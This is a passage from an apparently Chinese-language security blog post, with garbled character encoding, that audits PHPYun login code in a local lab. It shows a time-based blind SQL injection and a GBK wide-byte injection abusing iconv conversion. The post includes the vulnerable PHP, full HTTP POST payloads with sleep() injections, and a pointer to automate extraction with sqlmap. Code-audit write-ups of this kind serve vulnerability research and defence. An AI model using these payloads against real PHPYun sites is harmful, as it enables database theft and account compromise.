Host: 192.168.91.39:8082
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM
Connection: close
Content-Length: 86
Content-Type: application/x-www-form-urlencoded

submit=1&amp;username=1&#39;+or+sleep(10)%23&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81
</code></pre>
<p>å³å¯è¿›è¡Œsqlç›²æ³¨ï¼Œç„¶åäº¤ç»™sqlmapå°±è¡Œ</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162133490.png" alt="image-20240116213342396"></p>
<h3 id="æ³¨å…¥äºŒ"><a href="#æ³¨å…¥äºŒ" class="headerlink" title="æ³¨å…¥äºŒ"></a>æ³¨å…¥äºŒ</h3><p>å®¡è¿™é‡Œçš„æ—¶å€™å°±æ”¶è·å¤§å¤§æ»´ï¼ŒåŸç†å¯ä»¥çœ‹pç‰›çš„<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
<p>åœ¨è¿æ¥æ•°æ®åº“çš„æ—¶å€™ä¼šè¿›è¡Œä»¥ä¸‹æ“ä½œ</p>
<pre><code class="php">$this-&gt;coding=&quot;gbk&quot;;
@mysql_query(&quot;SET NAMES $this-&gt;coding&quot;);
@mysql_query(&quot;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&quot;, $this-&gt;conn); 
</code></pre>
<p>è¿™é‡Œè¿›è¡Œäº†<code>character_set_client=binary</code>æ“ä½œ</p>
<p>è¿™é‡Œçš„æ„æ€å°±æ˜¯ï¼Œåœ¨æ•°æ®è¿›å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œmysqlä¸ä¼šæŠŠæ•°æ®è§†ä¸ºå­—èŠ‚æµï¼Œè€Œæ˜¯è§†ä¸ºå•ä¸ªå­—èŠ‚</p>
<p>å³åœ¨gbkç¼–ç ä¸‹ï¼Œä¸ä¼šæŠŠ<code>\xdf5c</code>è¯†åˆ«ä¸ºä¸­æ–‡å­—ç¬¦<code>é‹</code>ï¼Œè€Œæ˜¯è¯†åˆ«ä¸º<code>0xdf</code>å’Œ<code>0x5c</code>çš„asciiç </p>
<p>æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™é‡Œæ˜¯ä¸ä¼šå­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„ï¼Œä½†æ˜¯ï¼</p>
<p>æœ‰ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œï¼Œå³<code>iconv(&quot;utf-8&quot;,&quot;gbk&quot;,$s)</code></p>
<p>ä¼šæŠŠå­—ç¬¦ä»utf-8ç¼–ç è½¬æ¢ä¸ºgbkç¼–ç ï¼Œå¤§å¤šæ•°æ˜¯ä¸ºäº†é˜²æ­¢ä¹±ç çš„å‡ºç°ï¼Œä½†æ˜¯å´é€ æˆäº†ä¸€ä¸ªsqlæ³¨å…¥æ¼æ´</p>
<p>æ¯”å¦‚ï¼Œå°†ä¸€ä¸ªä¸­æ–‡å­—ç¬¦ä»utf-8è½¬ä¸ºgbkç¼–ç åï¼Œä»–çš„16æœºåˆ¶ä¸º<code>xx5c</code>ï¼ŒåŒæ—¶åæ–œæ <code>\</code>çš„asciiç çš„16è¿›åˆ¶ä¹Ÿä¸º<code>5c</code></p>
<p>å¹¶ä¸”msqlä»¥binaryçš„æ ¼å¼è¯»å–è¿™ä¸¤ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šè¯»æˆ<code>xx5c5c</code>ï¼Œä¹Ÿå°±ä¼šæœ‰ä¸¤ä¸ª<code>\</code>ï¼Œä»è€ŒæŠŠåæ–œæ <code>\</code>è½¬ä¹‰æ‰ï¼Œé€ æˆå•å¼•å·<code>&#39;</code>é€ƒé€¸</p>
<p>åœ¨ç™»å½•æ—¶ï¼Œä¼šè¿›å…¥è·¯ç”±<code>/index.php?m=login&amp;c=loginsave</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162209669.png" alt="image-20240116220957542"></p>
<p>è¿™ä¸ªå‡½æ•°æœ‰ä»¥ä¸‹æ“ä½œ</p>
<pre><code class="php">$username=iconv(&quot;utf-8&quot;,&quot;gbk&quot;,$_POST[&#39;username&#39;]);
...
$user = $this-&gt;obj-&gt;DB_select_once(&quot;member&quot;,&quot;`username`=&#39;&quot;.$username.&quot;&#39;&quot;,&quot;`pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status`&quot;);
</code></pre>
<p>æœ€åä¼šæ‰§è¡Œä»¥ä¸‹sqlè¯­å¥</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162214882.png" alt="image-20240116221437742"></p>
<pre><code class="sql">SELECT `pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status` FROM phpyun_member WHERE `username`=&#39;1234567&#39; limit 1
</code></pre>
<p>è¿™é‡Œçš„usernameæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œå¯ä»¥æ ¹æ®ä¸Šé¢çš„åŸç†è¿›è¡Œæ—¶é—´ç›²æ³¨</p>
<p>å¯èƒ½æ˜¯æˆ‘è™šæ‹Ÿæœºçš„é—®é¢˜ï¼Œæ—¶é—´ä¸€é•¿ç½‘ç«™å°±é­ä¸ä½ï¼Œæ‰€ä»¥æ—¶é—´å¾—å¼„çŸ­ä¸€ç‚¹</p>
<p>payload</p>
<pre><code>POST /index.php?m=login&amp;c=loginsave&amp;admin_dir=admin HTTP/1.1
Host: 192.168.91.39:8082
Content-Length: 67
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.91.39:8082
Referer: http://192.168.91.39:8082/index.php?m=login&amp;usertype=2
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM
Connection: close

username=éŒ¦&#39;+or+sleep(2)%23&amp;password=1234567&amp;usertype=2&amp;path=index&amp;loginname=1&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81
</code></pre>
<p>è¿™é‡Œçš„ä¸­æ–‡å­—ç¬¦ä½¿ç”¨â€œéŒ¦â€,å…¶å®åªè¦æ˜¯gbkç¼–ç åé¢ä»¥5cç»“å°¾å³å¯ï¼Œâ€œçŒâ€ä¹Ÿå¯ä»¥</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162217473.png" alt="image-20240116221728297"></p>
<p>è¿™é‡Œè™½ç„¶æ˜¾ç¤ºçš„è™½ç„¶æ²¡æœ‰ä¸¤ä¸ª<code>\</code>ï¼Œä½†æ˜¯åé¢åˆ°æ•°æ®åº“å°±ä¼šäº†</p>
<p>æ˜æ˜¾çš„å»¶æ—¶ï¼Œç„¶åä¸¢ç»™sqlmapå°±è¡Œäº†</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233404.png" alt="image-20240116223306296"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233152.png" alt="image-20240116223318053"></p>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2024-01-16</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/php/'>
                            php
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
                            ä»£ç å®¡è®¡
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>